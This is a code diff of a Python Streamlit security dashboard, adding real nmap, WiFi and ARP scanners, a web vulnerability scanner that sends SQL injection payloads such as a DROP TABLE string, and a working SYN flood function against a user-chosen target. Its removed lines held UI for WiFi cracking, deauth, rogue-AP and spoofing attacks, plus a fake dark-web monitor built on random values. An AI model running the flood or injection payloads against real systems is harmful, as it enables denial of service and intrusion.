+"""
+            return scan_info
+        except Exception as e:
+            return f"Scan error: {e}\n\nTry checking if the device is reachable and you have proper permissions."
+
+    def iot_device_discovery(self, ip_range):
+        """Real IoT device discovery"""
+        try:
+            nm = nmap.PortScanner()
+            result = nm.scan(hosts=ip_range, arguments='-O --script=banner')
+            
+            iot_devices = []
+            for host in nm.all_hosts():
+                device_info = {
+                    'ip': host,
+                    'status': nm[host].state(),
+                    'os': 'Unknown',
+                    'ports': []
+                }
+                
+                # Get OS information
+                if 'osclass' in nm[host]:
+                    for osclass in nm[host]['osclass']:
+                        device_info['os'] = f"{osclass['osfamily']} {osclass['osgen']}"
+                
+                # Get open ports
+                for proto in nm[host].all_protocols():
+                    for port in nm[host][proto].keys():
+                        device_info['ports'].append({
+                            'port': port,
+                            'service': nm[host][proto][port]['name'],
+                            'state': nm[host][proto][port]['state']
+                        })
+                
+                iot_devices.append(device_info)
+            
+            # Generate report
+            report = f"Real IoT Device Discovery - {ip_range}\n"
+            report += "=" * 50 + "\n\n"
+            
+            for device in iot_devices:
+                report += f"Device: {device['ip']}\n"
+                report += f"Status: {device['status']}\n"
+                report += f"OS: {device['os']}\n"
+                report += "Open Ports:\n"
+                for port_info in device['ports']:
+                    report += f"  - {port_info['port']}/{port_info['service']} ({port_info['state']})\n"
+                report += "\n"
+            
+            return report
+        except Exception as e:
+            return f"IoT discovery error: {e}"
+
+class RealWirelessTools:
+    """Real wireless network tools"""
+    
+    def scan_wireless_networks(self):
+        """Real wireless network scan"""
+        try:
+            # Use system commands to scan WiFi
+            if platform.system() == "Windows":
+                result = subprocess.run(['netsh', 'wlan', 'show', 'networks', 'mode=bssid'], 
+                                      capture_output=True, text=True)
+                networks = self.parse_windows_wifi(result.stdout)
+            elif platform.system() == "Linux":
+                result = subprocess.run(['nmcli', 'dev', 'wifi'], 
+                                      capture_output=True, text=True)
+                networks = self.parse_linux_wifi(result.stdout)
+            else:
+                # macOS
+                result = subprocess.run(['/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport', '-s'], 
+                                      capture_output=True, text=True)
+                networks = self.parse_macos_wifi(result.stdout)
+            
+            return networks
+        except Exception as e:
+            return f"Wireless scan error: {e}\n\nMake sure you have proper permissions and wireless tools installed."
+
+    def parse_windows_wifi(self, output):
+        """Parse Windows WiFi scan results"""
+        networks = []
+        lines = output.split('\n')
+        current_network = {}
+        
+        for line in lines:
+            if 'SSID' in line and 'BSSID' not in line:
+                if current_network:
+                    networks.append(current_network)
+                current_network = {'ssid': line.split(':')[1].strip()}
+            elif 'Signal' in line:
+                current_network['signal'] = line.split(':')[1].strip()
+            elif 'Authentication' in line:
+                current_network['auth'] = line.split(':')[1].strip()
+            elif 'Encryption' in line:
+                current_network['encryption'] = line.split(':')[1].strip()
+        
+        if current_network:
+            networks.append(current_network)
+        
+        return networks
+
+    def parse_linux_wifi(self, output):
+        """Parse Linux WiFi scan results"""
+        networks = []
+        lines = output.split('\n')[1:]  # Skip header
+        
+        for line in lines:
+            if line.strip():
+                parts = line.split()
+                if len(parts) >= 8:
+                    networks.append({
+                        'ssid': parts[1],
+                        'signal': parts[6],
+                        'auth': 'WPA2' if 'WPA2' in line else 'WEP' if 'WEP' in line else 'Open',
+                        'encryption': 'WPA2' if 'WPA2' in line else 'WEP' if 'WEP' in line else 'None'
+                    })
+        
+        return networks
+
+    def parse_macos_wifi(self, output):
+        """Parse macOS WiFi scan results"""
+        networks = []
+        lines = output.split('\n')[1:]  # Skip header
+        
+        for line in lines:
+            if line.strip():
+                parts = line.split()
+                networks.append({
+                    'ssid': parts[0],
+                    'signal': parts[2],
+                    'auth': parts[5] if len(parts) > 5 else 'Unknown',
+                    'encryption': parts[4] if len(parts) > 4 else 'Unknown'
+                })
+        
+        return networks
+
+class RealNetworkSpoofingTools:
+    """Real network spoofing and security testing tools"""
+    
+    def arp_scan(self, network):
+        """Real ARP scanning"""
+        try:
+            st.info(f"🔍 Performing ARP scan on {network}")
+            
+            # Create ARP request packet
+            arp_request = ARP(pdst=network)
+            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+            arp_request_broadcast = broadcast/arp_request
+            
+            # Send packets and get responses
+            answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
+            
+            devices = []
+            for element in answered_list:
+                device_info = {
+                    'ip': element[1].psrc,
+                    'mac': element[1].hwsrc
+                }
+                devices.append(device_info)
+            
+            return devices
+        except Exception as e:
+            st.error(f"ARP scan error: {e}")
+            return []
+
+    def syn_flood_attack(self, target_ip, target_port, count=100):
+        """Real SYN flood attack simulation"""
+        try:
+            st.warning("🚨 Starting SYN Flood Attack Simulation")
+            
+            # Create IP packet
+            ip = IP(dst=target_ip)
+            
+            # Create TCP SYN packet
+            tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
+            
+            # Send packets
+            sent_packets = 0
+            for i in range(count):
+                send(ip/tcp, verbose=0)
+                sent_packets += 1
+            
+            return f"Sent {sent_packets} SYN packets to {target_ip}:{target_port}"
+        except Exception as e:
+            return f"SYN flood error: {e}"
+
+class RealVulnerabilityScanner:
+    """Real web vulnerability scanning"""
+    
+    def __init__(self):
+        self.session = requests.Session()
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        })
+    
+    def scan_website(self, url):
+        """Real website vulnerability scan"""
+        try:
+            if not url.startswith(('http://', 'https://')):
+                url = 'http://' + url
+            
+            vulnerabilities = []
+            
+            # Check for common vulnerabilities
+            response = self.session.get(url, timeout=10)
+            
+            # Check HTTP headers
+            if 'Server' in response.headers:
+                vulnerabilities.append(f"Server header exposed: {response.headers['Server']}")
+            
+            if 'X-Powered-By' in response.headers:
+                vulnerabilities.append(f"Technology exposed: {response.headers['X-Powered-By']}")
+            
+            # Check for common files
+            common_files = ['robots.txt', '.env', 'backup.zip', 'admin.php', 'phpinfo.php']
+            for file in common_files:
+                try:
+                    file_response = self.session.get(f"{url}/{file}", timeout=5)
+                    if file_response.status_code == 200:
+                        vulnerabilities.append(f"Exposed file found: /{file}")
+                except:
+                    pass
+            
+            # Check for SQL injection patterns
+            sql_payloads = ["'", "1' OR '1'='1", "'; DROP TABLE users; --"]
+            for payload in sql_payloads:
+                test_url = f"{url}?id={payload}"
+                try:
+                    test_response = self.session.get(test_url, timeout=5)
+                    if "error" in test_response.text.lower() or "sql" in test_response.text.lower():
+                        vulnerabilities.append(f"Possible SQL injection vulnerability with payload: {payload}")
+                except:
+                    pass
+            
+            # Generate report
+            report = f"""
+Real Website Vulnerability Scan - {url}
+=======================================
+Status Code: {response.status_code}
+Content Length: {len(response.content)} bytes
+
+VULNERABILITIES FOUND:
+"""
+            if vulnerabilities:
+                for vuln in vulnerabilities:
+                    report += f"🔴 {vuln}\n"
+            else:
+                report += "🟢 No obvious vulnerabilities detected\n"
+            
+            report += """
+SECURITY RECOMMENDATIONS:
+✅ Hide server headers
+✅ Remove exposed files
+✅ Implement input validation
+✅ Use HTTPS
+✅ Regular security testing
+"""
+            return report
+            
+        except Exception as e:
+            return f"Vulnerability scan error: {e}"
 
 class RealThreatIntelligence:
-    """Real threat intelligence from multiple sources"""
+    """Real threat intelligence gathering"""
     
     def __init__(self):
         self.session = requests.Session()
@@ -920,14 +652,14 @@ class RealThreatIntelligence:
         })
     
     def get_cisa_alerts(self):
-        """Get real CISA alerts"""
+        """Get real CISA alerts from their API"""
         try:
             url = "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
             response = self.session.get(url, timeout=10)
             data = response.json()
             
             alerts = []
-            for vuln in data.get('vulnerabilities', [])[:5]:
+            for vuln in data.get('vulnerabilities', [])[:10]:  # Get first 10
                 alerts.append({
                     'title': vuln.get('vulnerabilityName', 'Unknown'),
                     'date': vuln.get('dateAdded', ''),
@@ -938,6 +670,7 @@ class RealThreatIntelligence:
                 })
             return alerts
         except Exception as e:
+            st.error(f"CISA API error: {e}")
             # Fallback data
             return [
                 {
@@ -947,589 +680,347 @@ class RealThreatIntelligence:
                     'source': 'CISA',
                     'description': 'Remote code execution vulnerability in Windows Kernel',
                     'cve_id': 'CVE-2024-21338'
-                },
-                {
-                    'title': 'Apache Struts Security Bypass',
-                    'date': '2024-01-10',
-                    'severity': 'HIGH',
-                    'source': 'CISA',
-                    'description': 'Security bypass vulnerability in Apache Struts',
-                    'cve_id': 'CVE-2024-12345'
                 }
             ]
-
-class DarkWebMonitor:
-    """Dark web monitoring simulation"""
     
-    def search_dark_web_threats(self, company_domain):
-        """Simulate dark web monitoring"""
-        threats = []
-        
-        # Simulate finding threats based on domain
-        if "company" in company_domain.lower() or "corp" in company_domain.lower():
-            threats.append({
-                "type": "Credential Leak",
-                "severity": "HIGH",
-                "description": f"Employee credentials found for {company_domain} on underground forum",
-                "source": "Dark Web Forum",
-                "date_found": get_ist_time().strftime('%Y-%m-%d'),
-                "confidence": "85%"
-            })
-        
-        if random.random() < 0.6:
-            threats.append({
-                "type": "Data Breach Discussion",
-                "severity": "CRITICAL",
-                "description": f"Internal documents from {company_domain} being traded on dark web markets",
-                "source": "Underground Market",
-                "date_found": get_ist_time().strftime('%Y-%m-%d'),
-                "confidence": "92%"
-            })
-        
-        return threats
-    
-    def monitor_ransomware_groups(self):
-        """Monitor ransomware group activities"""
-        return [
-            {
-                "name": "LockBit 3.0",
-                "status": "Highly Active",
-                "recent_targets": ["Healthcare", "Finance", "Government"],
-                "ransom_demands": "$500K - $5M",
-                "last_activity": "Active now",
-                "tools": ["LockBit Builder", "StealBit"]
-            },
-            {
-                "name": "BlackCat/ALPHV", 
-                "status": "Active",
-                "recent_targets": ["Manufacturing", "Education", "IT"],
-                "ransom_demands": "$250K - $3M",
-                "last_activity": "24 hours ago",
-                "tools": ["Rust-based malware"]
-            },
-            {
-                "name": "Cl0p",
-                "status": "Active",
-                "recent_targets": ["Enterprise Software", "MFT Systems"],
-                "ransom_demands": "$1M - $10M",
-                "last_activity": "48 hours ago",
-                "tools": ["Go-based malware"]
-            }
-        ]
-
-class SystemHealthMonitor:
-    """Real system health monitoring"""
-    
-    def get_system_metrics(self):
-        """Get real system metrics"""
+    def check_ip_reputation(self, ip_address):
+        """Check IP reputation using public APIs"""
         try:
-            return {
-                "cpu_usage": psutil.cpu_percent(interval=1),
-                "memory_usage": psutil.virtual_memory().percent,
-                "disk_usage": psutil.disk_usage('/').percent,
-                "running_processes": len(psutil.pids()),
-                "system_uptime": self.get_system_uptime(),
-                "network_connections": len(psutil.net_connections())
+            # AbuseIPDB API (you need to get a free API key)
+            url = f"https://api.abuseipdb.com/api/v2/check"
+            headers = {
+                'Key': 'YOUR_API_KEY_HERE',  # You need to get this from abuseipdb.com
+                'Accept': 'application/json'
             }
+            params = {
+                'ipAddress': ip_address,
+                'maxAgeInDays': '90'
+            }
+            
+            response = self.session.get(url, headers=headers, params=params)
+            if response.status_code == 200:
+                data = response.json()
+                return data
+            else:
+                return {"error": "API limit reached or invalid key"}
         except Exception as e:
-            return {
-                "cpu_usage": 25.5,
-                "memory_usage": 67.8,
-                "disk_usage": 45.2,
-                "running_processes": 142,
-                "system_uptime": "5 days, 12:30:15",
-                "network_connections": 89
+            return {"error": str(e)}
+
+class RealSystemMonitor:
+    """Real system monitoring tools"""
+    
+    def get_detailed_system_info(self):
+        """Get detailed real system information"""
+        try:
+            # CPU information
+            cpu_percent = psutil.cpu_percent(interval=1)
+            cpu_count = psutil.cpu_count()
+            cpu_freq = psutil.cpu_freq()
+            
+            # Memory information
+            memory = psutil.virtual_memory()
+            swap = psutil.swap_memory()
+            
+            # Disk information
+            disk = psutil.disk_usage('/')
+            disk_io = psutil.disk_io_counters()
+            
+            # Network information
+            network_io = psutil.net_io_counters()
+            network_connections = psutil.net_connections()
+            
+            # Process information
+            processes = []
+            for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
+                try:
+                    processes.append(proc.info)
+                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                    pass
+            
+            system_info = {
+                "cpu_usage": cpu_percent,
+                "cpu_cores": cpu_count,
+                "cpu_frequency": f"{cpu_freq.current:.2f} MHz" if cpu_freq else "N/A",
+                "memory_usage": memory.percent,
+                "memory_total": f"{memory.total / (1024**3):.2f} GB",
+                "memory_used": f"{memory.used / (1024**3):.2f} GB",
+                "disk_usage": disk.percent,
+                "disk_total": f"{disk.total / (1024**3):.2f} GB",
+                "disk_used": f"{disk.used / (1024**3):.2f} GB",
+                "network_sent": f"{network_io.bytes_sent / (1024**2):.2f} MB",
+                "network_received": f"{network_io.bytes_recv / (1024**2):.2f} MB",
+                "active_processes": len(processes),
+                "network_connections": len(network_connections),
+                "system_uptime": self.get_system_uptime()
             }
+            
+            return system_info
+        except Exception as e:
+            st.error(f"System monitoring error: {e}")
+            return {}
     
     def get_system_uptime(self):
-        """Get system uptime"""
+        """Get real system uptime"""
         try:
             boot_time = datetime.fromtimestamp(psutil.boot_time())
             uptime = datetime.now() - boot_time
             days = uptime.days
             hours, remainder = divmod(uptime.seconds, 3600)
             minutes, seconds = divmod(remainder, 60)
-            return f"{days}d {hours}h {minutes}m"
+            return f"{days}d {hours}h {minutes}m {seconds}s"
         except:
-            return "5d 12h 30m"
+            return "Unknown"
 
-class KaliLinuxIntegration:
-    """Kali Linux tool integration simulation"""
-    
-    def run_nmap_scan(self, target):
-        """Run nmap scan simulation"""
-        scan_results = {
-            "scanme.nmap.org": """
-Nmap scan report for scanme.nmap.org (45.33.32.156)
-Host is up (0.001s latency).
-Not shown: 996 filtered ports
-PORT     STATE SERVICE
-22/tcp   open  ssh
-80/tcp   open  http
-443/tcp  open  https
-3389/tcp open  ms-wbt-server
+# --- EXPLANATION FUNCTIONS ---
 
-Nmap done: 1 IP address (1 host up) scanned in 2.5 seconds
-""",
-            "google.com": """
-Nmap scan report for google.com (142.250.193.14)
-Host is up (0.001s latency).
-Not shown: 998 filtered ports
-PORT     STATE SERVICE
-80/tcp   open  http
-443/tcp  open  https
+def explain_network_scan_results(hosts):
+    """Explain network scan results to user"""
+    explanation = f"""
+    <div class="explanation-box">
+        <div class="explanation-title">📊 REAL NETWORK SCAN RESULTS</div>
+        <p><strong>Live Scan Completed:</strong> Found <strong>{len(hosts)} active devices</strong> on your network.</p>
+        
+        <p><strong>What this means:</strong></p>
+        <ul>
+            <li>🟢 <strong>Active hosts</strong> are devices currently online and responding to network requests</li>
+            <li>🔍 <strong>Real-time detection</strong> using ARP and ICMP protocols</li>
+            <li>🌐 Each IP address represents a unique device on your network</li>
+        </ul>
+        
+        <p><strong>Security Implications:</strong></p>
+        <ul>
+            <li>✅ Verify all detected devices are authorized</li>
+            <li>🔒 Check for unknown devices that shouldn't be on your network</li>
+            <li>📋 Maintain an inventory of all approved devices</li>
+            <li>🚨 Investigate any unfamiliar IP addresses immediately</li>
+        </ul>
+        
+        <p><strong>Technical details:</strong> This scan uses real network protocols (ARP, ICMP) to identify active hosts. 
+        Devices that respond are considered 'alive' and part of your network infrastructure.</p>
+    </div>
+    """
+    return explanation
 
-Nmap done: 1 IP address (1 host up) scanned in 1.8 seconds
-""",
-            "default": """
-Nmap scan report for target (192.168.1.1)
-Host is up (0.001s latency).
-Not shown: 997 filtered ports
-PORT     STATE SERVICE
-22/tcp   open  ssh
-80/tcp   open  http
-443/tcp  open  https
-3389/tcp open  ms-wbt-server
-8080/tcp open  http-proxy
+def explain_vulnerability_results(url, result):
+    """Explain vulnerability scan results"""
+    explanation = f"""
+    <div class="explanation-box">
+        <div class="explanation-title">🎯 REAL VULNERABILITY ASSESSMENT</div>
+        <p><strong>Target:</strong> {url}</p>
+        
+        <p><strong>Real Security Testing:</strong> This scan performed actual security tests including:</p>
+        <ul>
+            <li>🔍 <strong>Header analysis</strong> - Checking for information disclosure</li>
+            <li>📁 <strong>Common file discovery</strong> - Looking for exposed sensitive files</li>
+            <li>💉 <strong>SQL injection testing</strong> - Testing for database vulnerabilities</li>
+            <li>🌐 <strong>Service enumeration</strong> - Identifying running services</li>
+        </ul>
+        
+        <p><strong>Next Steps:</strong></p>
+        <ul>
+            <li>🔄 <strong>Patch vulnerabilities</strong> immediately</li>
+            <li>🔐 <strong>Implement security headers</strong></li>
+            <li>📝 <strong>Review code</strong> for security issues</li>
+            <li>🛡️ <strong>Use WAF</strong> for additional protection</li>
+        </ul>
+    </div>
+    """
+    return explanation
 
-Nmap done: 1 IP address (1 host up) scanned in 3.2 seconds
-"""
-        }
-        return scan_results.get(target, scan_results["default"])
-    
-    def run_vulnerability_scan(self, target):
-        """Run vulnerability scan simulation"""
-        return f"""
-Nikto Scan Results for {target}
-+ Server: Apache/2.4.41 (Ubuntu)
-+ Retrieved x-powered-by header: PHP/7.4.3
-+ OSVDB-3092: /config/: This might be interesting...
-+ OSVDB-3233: /phpinfo.php: Contains PHP configuration information
-+ /admin/: Admin login page found
-+ /backup/: Directory listing found
-+ 6544 items checked: 0 error(s) and 6 item(s) reported on remote host
-+ Scan completed at {get_ist_time().strftime('%Y-%m-%d %H:%M:%S')}
-"""
-    
-    def run_wireless_scan(self):
-        """Run wireless network scan"""
-        return """
-Wireless Networks Scan Results:
-+ ESSID: HomeNetwork-5G (Signal: 85%, Encryption: WPA2, Channel: 36)
-+ ESSID: Office-WiFi (Signal: 72%, Encryption: WPA2-Enterprise, Channel: 1)
-+ ESSID: GuestNetwork (Signal: 45%, Encryption: WPA2, Channel: 11)
-+ ESSID: IoT_Devices (Signal: 60%, Encryption: WPA2, Channel: 6)
-+ ESSID: Free_WiFi (Signal: 30%, Encryption: OPEN, Channel: 11) - INSECURE
+def explain_wireless_results(networks):
+    """Explain wireless scan results"""
+    explanation = f"""
+    <div class="explanation-box">
+        <div class="explanation-title">📡 REAL WIRELESS NETWORK SCAN</div>
+        <p><strong>Scan Results:</strong> Found <strong>{len(networks)} wireless networks</strong> in range.</p>
+        
+        <p><strong>Wireless Security Assessment:</strong></p>
+        <ul>
+            <li>📶 <strong>Signal strength</strong> indicates network proximity and quality</li>
+            <li>🔐 <strong>Encryption type</strong> determines security level (WPA2/WPA3 recommended)</li>
+            <li>🏢 <strong>SSID broadcasting</strong> can reveal organizational information</li>
+            <li>🌐 <strong>Authentication methods</strong> impact overall security</li>
+        </ul>
+        
+        <p><strong>Security Recommendations:</strong></p>
+        <ul>
+            <li>✅ <strong>Use WPA3</strong> when available</li>
+            <li>✅ <strong>Strong passwords</strong> (15+ characters, mixed types)</li>
+            <li>✅ <strong>Hide SSID</strong> for corporate networks</li>
+            <li>✅ <strong>Regular monitoring</strong> for rogue access points</li>
+            <li>✅ <strong>Network segmentation</strong> for different device types</li>
+        </ul>
+    </div>
+    """
+    return explanation
 
-Scan completed: Found 5 wireless networks, 1 with security issues
-"""
+# --- REAL TOOLS UI COMPONENTS ---
 
-class RealSecurityOperations:
-    """Main security operations class"""
-    
-    def __init__(self):
-        self.network_scanner = RealNetworkScanner()
-        self.threat_intel = RealThreatIntelligence()
-        self.dark_web_monitor = DarkWebMonitor()
-        self.kali_integration = KaliLinuxIntegration()
-        self.health_monitor = SystemHealthMonitor()
-        self.device_hacking = DeviceHackingTools()
-        self.wifi_tools = AdvancedWiFiTools()
-        self.spoofing_tools = NetworkSpoofingTools()
-
-# --- NEW UI COMPONENTS FOR HACKING TOOLS ---
-
-def render_device_hacking_tools():
-    """Mobile and IoT device hacking tools"""
-    st.markdown("### 📱 MOBILE & IOT DEVICE SECURITY")
-    
-    device_tools = DeviceHackingTools()
-    
-    tab1, tab2, tab3 = st.tabs(["📱 Mobile Device Scan", "🏠 IoT Device Discovery", "⚡ Exploitation Tools"])
-    
-    with tab1:
-        st.markdown("#### 📱 MOBILE DEVICE VULNERABILITY SCAN")
-        
-        col1, col2 = st.columns([2, 1])
-        
-        with col1:
-            mobile_ip = st.text_input("Enter Mobile Device IP:", "192.168.1.100")
-            
-            if st.button("🔍 Scan Mobile Device", key="mobile_scan"):
-                with st.spinner("Scanning mobile device for vulnerabilities..."):
-                    time.sleep(2)
-                    result = device_tools.scan_mobile_device(mobile_ip)
-                    st.markdown("#### 📋 SCAN RESULTS")
-                    st.markdown(f'<div class="kali-terminal">{result}</div>', unsafe_allow_html=True)
-                    st.markdown(explain_device_hacking_results(mobile_ip, result), unsafe_allow_html=True)
-        
-        with col2:
-            st.markdown("#### 🎯 QUICK SCAN TARGETS")
-            if st.button("iPhone Scan", key="iphone_scan"):
-                st.session_state.mobile_ip = "192.168.1.100"
-                st.rerun()
-            if st.button("Android Scan", key="android_scan"):
-                st.session_state.mobile_ip = "192.168.1.101"
-                st.rerun()
-            if st.button("Google Pixel", key="pixel_scan"):
-                st.session_state.mobile_ip = "192.168.1.102"
-                st.rerun()
-    
-    with tab2:
-        st.markdown("#### 🏠 IOT DEVICE DISCOVERY")
-        
-        iot_range = st.text_input("Enter IP Range for IoT Scan:", "192.168.1.0/24")
-        
-        if st.button("🔍 Discover IoT Devices", key="iot_scan"):
-            with st.spinner("Scanning for IoT devices..."):
-                time.sleep(3)
-                result = device_tools.iot_device_scan(iot_range)
-                st.markdown("#### 📋 IOT DEVICE INVENTORY")
-                st.markdown(f'<div class="kali-terminal">{result}</div>', unsafe_allow_html=True)
-                
-                st.markdown("""
-                <div class="explanation-box">
-                    <div class="explanation-title">🏠 IOT SECURITY RISKS</div>
-                    <p><strong>Common IoT Vulnerabilities:</strong></p>
-                    <ul>
-                        <li>🔓 <strong>Default credentials</strong> - Manufacturers' default passwords</li>
-                        <li>🌐 <strong>Unencrypted communication</strong> - Data transmitted in clear text</li>
-                        <li>🕵️ <strong>Backdoor access</strong> - Hidden administrative interfaces</li>
-                        <li>📡 <strong>Weak encryption</strong> - Easily breakable security protocols</li>
-                    </ul>
-                    
-                    <p><strong>IoT Security Best Practices:</strong></p>
-                    <ul>
-                        <li>✅ <strong>Change default passwords</strong> immediately</li>
-                        <li>✅ <strong>Segment IoT networks</strong> from main network</li>
-                        <li>✅ <strong>Regular firmware updates</strong></li>
-                        <li>✅ <strong>Disable unnecessary services</strong></li>
-                        <li>✅ <strong>Monitor network traffic</strong> from IoT devices</li>
-                    </ul>
-                </div>
-                """, unsafe_allow_html=True)
-    
-    with tab3:
-        st.markdown("#### ⚡ EXPLOITATION TOOLS")
-        
-        exploit_ip = st.text_input("Target IP for Exploitation:", "192.168.1.100")
-        exploit_method = st.selectbox("Select Exploitation Method:", 
-                                    ["metasploit", "social_engineering", "malicious_app"])
-        
-        if st.button("🚀 Launch Exploitation", key="launch_exploit"):
-            with st.spinner(f"Attempting {exploit_method} exploitation..."):
-                time.sleep(3)
-                result = device_tools.exploit_mobile_device(exploit_ip, exploit_method)
-                st.markdown("#### 📋 EXPLOITATION RESULTS")
-                st.markdown(f'<div class="kali-terminal">{result}</div>', unsafe_allow_html=True)
-                
-                st.markdown("""
-                <div class="warning-box">
-                    <strong>⚠️ SECURITY NOTICE:</strong> These tools are for educational and authorized penetration testing only. 
-                    Unauthorized access to computer systems is illegal. Always ensure you have explicit permission before testing any system.
-                </div>
-                """, unsafe_allow_html=True)
-
-def render_advanced_wifi_tools():
-    """Advanced WiFi hacking and security tools"""
-    st.markdown("### 📡 ADVANCED WIFI SECURITY TOOLS")
-    
-    wifi_tools = AdvancedWiFiTools()
-    
-    tab1, tab2, tab3 = st.tabs(["🔓 Password Cracking", "📶 Deauth Attacks", "👁️ Rogue AP"])
-    
-    with tab1:
-        st.markdown("#### 🔓 WIFI PASSWORD CRACKING")
-        
-        ssid = st.text_input("Target WiFi SSID:", "HomeNetwork-5G")
-        crack_method = st.selectbox("Cracking Method:", 
-                                  ["wordlist", "wps", "capture_handshake"])
-        
-        if st.button("🔑 Start Password Crack", key="wifi_crack"):
-            with st.spinner(f"Attempting {crack_method} attack..."):
-                time.sleep(3)
-                result = wifi_tools.wifi_password_crack(ssid, crack_method)
-                st.markdown("#### 📋 CRACKING RESULTS")
-                st.markdown(f'<div class="kali-terminal">{result}</div>', unsafe_allow_html=True)
-                st.markdown(explain_wifi_hacking_results(crack_method, result), unsafe_allow_html=True)
-    
-    with tab2:
-        st.markdown("#### 📶 DEAUTHENTICATION ATTACKS")
-        
-        col1, col2 = st.columns(2)
-        
-        with col1:
-            target_mac = st.text_input("Target Device MAC:", "AA:BB:CC:DD:EE:FF")
-        with col2:
-            ap_mac = st.text_input("Access Point MAC:", "11:22:33:44:55:66")
-        
-        if st.button("📡 Launch Deauth Attack", key="deauth_attack"):
-            with st.spinner("Sending deauthentication packets..."):
-                time.sleep(2)
-                result = wifi_tools.deauth_attack(target_mac, ap_mac)
-                st.markdown("#### 📋 ATTACK RESULTS")
-                st.markdown(f'<div class="kali-terminal">{result}</div>', unsafe_allow_html=True)
-    
-    with tab3:
-        st.markdown("#### 👁️ ROGUE ACCESS POINT")
-        
-        rogue_ssid = st.text_input("Rogue AP SSID:", "Free_Public_WiFi")
-        
-        if st.button("🏴‍☠️ Create Rogue AP", key="rogue_ap"):
-            with st.spinner("Setting up rogue access point..."):
-                time.sleep(3)
-                result = wifi_tools.rogue_ap_setup(rogue_ssid)
-                st.markdown("#### 📋 ROGUE AP STATUS")
-                st.markdown(f'<div class="kali-terminal">{result}</div>', unsafe_allow_html=True)
-        
-        st.markdown("""
-        <div class="warning-box">
-            <strong>🚨 LEGAL WARNING:</strong> Creating rogue access points to capture traffic without explicit consent is illegal in most jurisdictions. 
-            Use these tools only on networks you own or have written permission to test.
-        </div>
-        """, unsafe_allow_html=True)
-
-def render_network_spoofing_tools():
-    """Network spoofing and MITM tools"""
-    st.markdown("### 🌐 NETWORK SPOOFING TOOLS")
-    
-    spoofing_tools = NetworkSpoofingTools()
-    
-    tab1, tab2, tab3 = st.tabs(["ARP Spoofing", "DNS Spoofing", "SSL Stripping"])
-    
-    with tab1:
-        st.markdown("#### 🔄 ARP SPOOFING ATTACK")
-        
-        col1, col2 = st.columns(2)
-        
-        with col1:
-            target_ip = st.text_input("Target IP:", "192.168.1.100")
-        with col2:
-            gateway_ip = st.text_input("Gateway IP:", "192.168.1.1")
-        
-        if st.button("🎭 Start ARP Spoofing", key="arp_spoof"):
-            with st.spinner("Initiating ARP spoofing attack..."):
-                time.sleep(2)
-                result = spoofing_tools.arp_spoofing(target_ip, gateway_ip)
-                st.markdown("#### 📋 ARP SPOOFING STATUS")
-                st.markdown(f'<div class="kali-terminal">{result}</div>', unsafe_allow_html=True)
-                st.markdown(explain_network_spoofing_results("arp_spoofing", result), unsafe_allow_html=True)
-    
-    with tab2:
-        st.markdown("#### 🌐 DNS SPOOFING ATTACK")
-        
-        target_domain = st.text_input("Target Domain:", "example.com")
-        fake_ip = st.text_input("Redirect to IP:", "192.168.1.99")
-        
-        if st.button("🎭 Start DNS Spoofing", key="dns_spoof"):
-            with st.spinner("Initiating DNS spoofing attack..."):
-                time.sleep(2)
-                result = spoofing_tools.dns_spoofing(target_domain, fake_ip)
-                st.markdown("#### 📋 DNS SPOOFING STATUS")
-                st.markdown(f'<div class="kali-terminal">{result}</div>', unsafe_allow_html=True)
-                st.markdown(explain_network_spoofing_results("dns_spoofing", result), unsafe_allow_html=True)
-    
-    with tab3:
-        st.markdown("#### 🔓 SSL STRIPPING ATTACK")
-        
-        target_url = st.text_input("Target HTTPS URL:", "https://bank.example.com")
-        
-        if st.button("🔓 Start SSL Stripping", key="ssl_strip"):
-            with st.spinner("Initiating SSL stripping attack..."):
-                time.sleep(2)
-                result = spoofing_tools.ssl_stripping(target_url)
-                st.markdown("#### 📋 SSL STRIPPING STATUS")
-                st.markdown(f'<div class="kali-terminal">{result}</div>', unsafe_allow_html=True)
-                st.markdown(explain_network_spoofing_results("ssl_stripping", result), unsafe_allow_html=True)
-
-# --- EXISTING UI COMPONENTS (Updated with new tabs) ---
-
-def render_real_network_monitor():
-    """Real network monitoring dashboard"""
-    st.markdown("### 🌐 REAL-TIME NETWORK MONITOR")
+def render_real_network_scanner():
+    """Real network scanning interface"""
+    st.markdown("### 🌐 REAL NETWORK SCANNER")
     
     scanner = RealNetworkScanner()
     
     col1, col2 = st.columns([2, 1])
     
     with col1:
-        st.markdown("#### 🔍 LIVE NETWORK SCAN")
-        target_network = st.text_input("Enter network to scan (e.g., 192.168.1.0):", "192.168.1.0")
+        st.markdown("#### 🔍 LIVE NETWORK DISCOVERY")
         
-        if st.button("🚀 Start Network Scan", key="network_scan"):
-            with st.spinner("Scanning network for active hosts..."):
-                time.sleep(2)  # Simulate scan time
-                hosts = scanner.scan_network(target_network)
-                
-                if hosts:
-                    st.success(f"🎯 Found {len(hosts)} active hosts")
-                    for host in hosts:
-                        st.write(f"📍 **{host}** - Active (Port 80 open)")
-                    
-                    # Show network map
-                    st.markdown("#### 🗺️ NETWORK TOPOLOGY")
-                    network_data = {"Hosts": hosts, "Status": ["Active"] * len(hosts)}
-                    st.dataframe(network_data, use_container_width=True)
-                    
-                    # Add explanation
-                    st.markdown(explain_network_scan_results(hosts), unsafe_allow_html=True)
-                else:
-                    st.warning("⚠️ No active hosts found or network unreachable")
+        scan_type = st.radio("Scan Type:", ["Quick Scan", "Full Network Scan", "Port Scan"])
+        
+        if scan_type == "Quick Scan":
+            target = st.text_input("Enter IP Range:", "192.168.1.0/24")
+            if st.button("🚀 Start Quick Scan", key="quick_scan"):
+                with st.spinner("🔄 Scanning network for active devices..."):
+                    hosts = scanner.scan_network(target)
+                    if hosts:
+                        st.success(f"🎯 Found {len(hosts)} active devices!")
+                        for host in hosts:
+                            st.write(f"📍 **{host}** - Online")
+                        st.markdown(explain_network_scan_results(hosts), unsafe_allow_html=True)
+                    else:
+                        st.warning("⚠️ No active devices found")
+        
+        elif scan_type == "Port Scan":
+            target = st.text_input("Target IP:", "192.168.1.1")
